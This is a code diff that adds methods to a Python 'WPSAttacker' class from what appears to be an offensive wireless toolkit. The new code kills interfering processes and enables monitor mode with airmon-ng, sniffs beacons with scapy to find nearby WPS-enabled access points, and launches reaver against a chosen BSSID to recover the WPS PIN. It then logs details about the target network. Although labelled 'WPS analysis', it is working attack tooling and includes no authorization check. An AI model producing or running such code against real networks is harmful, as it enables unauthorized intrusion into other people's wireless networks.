@@ -19,6 +19,9 @@ from modules.utils import (
     get_temp_path,
     cleanup_temp_files
 )
+from datetime import datetime
+from scapy.all import *
+from threading import Thread
 
 class WPSAttacker:
     def __init__(self):
@@ -383,4 +386,265 @@ class WPSAttacker:
         except Exception as e:
             self.console.print(f"[red]Error during attack: {str(e)}[/red]")
         finally:
-            self.cleanup() 
+            self.cleanup()
+
+    def _check_wireless_tools(self):
+        """Check if required wireless tools are available"""
+        try:
+            subprocess.run(['iwconfig'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+            subprocess.run(['reaver', '--help'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+            return True
+        except FileNotFoundError:
+            self.console.print("[red]Error: Required tools not found. Please install wireless-tools and reaver.[/red]")
+            return False
+            
+    def _get_interface(self):
+        """Get wireless interface from user"""
+        try:
+            # Get list of wireless interfaces
+            result = subprocess.run(['iwconfig'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+            interfaces = []
+            
+            for line in result.stdout.decode().split('\n'):
+                if 'IEEE 802.11' in line:
+                    interface = line.split()[0]
+                    interfaces.append(interface)
+                    
+            if not interfaces:
+                self.console.print("[red]No wireless interfaces found![/red]")
+                return None
+                
+            # Create selection table
+            table = Table(title="Available Wireless Interfaces")
+            table.add_column("Option", style="cyan", justify="right")
+            table.add_column("Interface", style="green")
+            
+            for i, interface in enumerate(interfaces, 1):
+                table.add_row(str(i), interface)
+                
+            self.console.print(table)
+            
+            while True:
+                try:
+                    choice = int(input("\nSelect interface: "))
+                    if 1 <= choice <= len(interfaces):
+                        return interfaces[choice-1]
+                    else:
+                        self.console.print("[red]Invalid choice. Please try again.[/red]")
+                except ValueError:
+                    self.console.print("[red]Invalid input. Please enter a number.[/red]")
+                    
+        except Exception as e:
+            self.console.print(f"[red]Error getting wireless interfaces: {str(e)}[/red]")
+            return None
+            
+    def _enable_monitor_mode(self):
+        """Enable monitor mode on selected interface"""
+        try:
+            # Kill interfering processes
+            subprocess.run(['airmon-ng', 'check', 'kill'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+            
+            # Start monitor mode
+            result = subprocess.run(['airmon-ng', 'start', self.interface], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+            
+            # Check if monitor mode is enabled
+            check = subprocess.run(['iwconfig', self.interface], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+            if 'Mode:Monitor' in check.stdout.decode():
+                return True
+                
+            # If interface name changed, update it
+            for line in result.stdout.decode().split('\n'):
+                if '(monitor mode enabled on' in line:
+                    self.interface = line.split('on')[1].strip().strip(')')
+                    return True
+                    
+            return False
+            
+        except Exception as e:
+            self.console.print(f"[red]Error enabling monitor mode: {str(e)}[/red]")
+            return False
+            
+    def _scan_for_wps_networks(self):
+        """Scan for networks with WPS enabled"""
+        networks = []
+        
+        def packet_handler(pkt):
+            if pkt.haslayer(Dot11Beacon):
+                try:
+                    bssid = pkt[Dot11].addr2
+                    ssid = pkt[Dot11Elt].info.decode()
+                    channel = int(ord(pkt[Dot11Elt:3].info))
+                    signal = -(256-ord(pkt.notdecoded[-4:-3]))
+                    
+                    # Check for WPS support
+                    wps = False
+                    for element in pkt[Dot11Elt:]:
+                        if element.ID == 221 and element.info.startswith(b'\x00P\xf2\x04'):
+                            wps = True
+                            break
+                            
+                    if wps and bssid not in [n['bssid'] for n in networks]:
+                        networks.append({
+                            'ssid': ssid,
+                            'bssid': bssid,
+                            'channel': channel,
+                            'signal': signal
+                        })
+                        
+                except:
+                    pass
+                    
+        # Start channel hopping
+        def channel_hopper():
+            channel = 1
+            while self.running:
+                try:
+                    subprocess.run(['iwconfig', self.interface, 'channel', str(channel)],
+                                 stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                    channel = channel % 14 + 1
+                    time.sleep(0.5)
+                except:
+                    continue
+                    
+        self.running = True
+        hopper = Thread(target=channel_hopper)
+        hopper.daemon = True
+        hopper.start()
+        
+        # Scan for networks
+        with Progress() as progress:
+            task = progress.add_task("[cyan]Scanning for WPS networks...", total=None)
+            sniff(iface=self.interface, prn=packet_handler, timeout=20)
+            
+        self.running = False
+        
+        return networks
+        
+    def _get_target_network(self, networks):
+        """Let user select target network"""
+        if not networks:
+            self.console.print("[yellow]No WPS-enabled networks found![/yellow]")
+            return None
+            
+        table = Table(title="WPS-Enabled Networks")
+        table.add_column("Option", style="cyan", justify="right")
+        table.add_column("SSID", style="green")
+        table.add_column("BSSID", style="yellow")
+        table.add_column("Channel", justify="right", style="blue")
+        table.add_column("Signal", justify="right", style="red")
+        
+        for i, network in enumerate(networks, 1):
+            table.add_row(
+                str(i),
+                network['ssid'],
+                network['bssid'],
+                str(network['channel']),
+                str(network['signal']) + " dBm"
+            )
+            
+        self.console.print(table)
+        
+        while True:
+            try:
+                choice = int(input("\nSelect target network: "))
+                if 1 <= choice <= len(networks):
+                    return networks[choice-1]
+                else:
+                    self.console.print("[red]Invalid choice. Please try again.[/red]")
+            except ValueError:
+                self.console.print("[red]Invalid input. Please enter a number.[/red]")
+                
+    def start_attack(self):
+        """Start WPS analysis"""
+        try:
+            # Check requirements
+            if not self._check_wireless_tools():
+                return
+                
+            # Get wireless interface
+            self.interface = self._get_interface()
+            if not self.interface:
+                return
+                
+            # Enable monitor mode
+            self.console.print("\n[yellow]Enabling monitor mode...[/yellow]")
+            if not self._enable_monitor_mode():
+                self.console.print("[red]Failed to enable monitor mode![/red]")
+                return
+                
+            self.console.print("[green]Monitor mode enabled successfully![/green]")
+            
+            # Scan for WPS networks
+            networks = self._scan_for_wps_networks()
+            target = self._get_target_network(networks)
+            
+            if not target:
+                return
+                
+            # Start WPS analysis
+            self.console.print(f"\n[yellow]Starting WPS analysis on {target['ssid']}...[/yellow]")
+            
+            # Set channel
+            subprocess.run(['iwconfig', self.interface, 'channel', str(target['channel'])],
+                         stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                         
+            # Create output directory
+            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+            output_dir = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))),
+                                    'data', 'wps')
+            os.makedirs(output_dir, exist_ok=True)
+            
+            # Start reaver
+            cmd = [
+                'reaver',
+                '-i', self.interface,
+                '-b', target['bssid'],
+                '-c', str(target['channel']),
+                '-vv',
+                '-K', '1',  # Test if WPS is locked
+                '-o', os.path.join(output_dir, f'wps_{timestamp}.txt')
+            ]
+            
+            process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
+            
+            # Monitor output
+            with Progress() as progress:
+                task = progress.add_task("[cyan]Running WPS analysis...", total=None)
+                
+                while True:
+                    line = process.stdout.readline()
+                    if not line and process.poll() is not None:
+                        break
+                        
+                    if "WPS PIN:" in line:
+                        self.console.print(f"\n[green]{line.strip()}[/green]")
+                    elif "WPS locked" in line:
+                        self.console.print("\n[red]WPS is locked![/red]")
+                        break
+                    elif "AP rate limited" in line:
+                        self.console.print("\n[yellow]AP is rate limiting WPS attempts[/yellow]")
+                        break
+                        
+            # Log results
+            log_path = os.path.join(output_dir, f'analysis_{timestamp}.txt')
+            with open(log_path, 'w') as f:
+                f.write(f"WPS Analysis Log\n")
+                f.write(f"Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
+                f.write(f"Target SSID: {target['ssid']}\n")
+                f.write(f"Target BSSID: {target['bssid']}\n")
+                f.write(f"Channel: {target['channel']}\n")
+                f.write(f"Signal Strength: {target['signal']} dBm\n")
+                
+            self.console.print(f"\n[green]Analysis log saved to: {log_path}[/green]")
+            
+        except Exception as e:
+            self.console.print(f"[red]Error during WPS analysis: {str(e)}[/red]")
+            
+        finally:
+            # Cleanup
+            try:
+                subprocess.run(['airmon-ng', 'stop', self.interface], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+            except:
+                pass
+            
+            input("\nPress Enter to continue...") 
